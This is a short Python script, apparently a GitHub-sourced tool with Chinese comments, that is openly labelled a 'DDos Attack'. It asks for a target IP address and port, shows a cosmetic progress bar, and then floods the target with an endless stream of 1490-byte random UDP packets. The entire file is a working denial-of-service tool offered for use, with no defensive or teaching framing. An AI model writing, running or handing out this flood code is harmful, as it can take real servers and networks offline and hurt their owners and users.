import os
import time
import socket
import random

# 创建 UDP 套接字
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)  # 生成随机字节数据

# 清屏 & 显示标题
os.system("clear")
os.system("figlet DDos Attack")
print("Author   : HA-MRX")
print("GitHub   : https://github.com/Ha3MrX")

# 输入目标信息
ip = input("IP Target : ")
port = int(input("Port       : "))  # 端口号转换为整数

# 显示攻击进度
os.system("clear")
os.system("figlet Attack Starting")
progress = ["[                    ] 0%", "[=====               ] 25%",
            "[==========          ] 50%", "[===============     ] 75%",
            "[====================] 100%"]

for p in progress:
    print(p)
    time.sleep(1)  # 加快进度条显示速度

# 开始无限循环攻击
sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent += 1
    print(f"Sent {sent} packets to {ip} through port {port}")
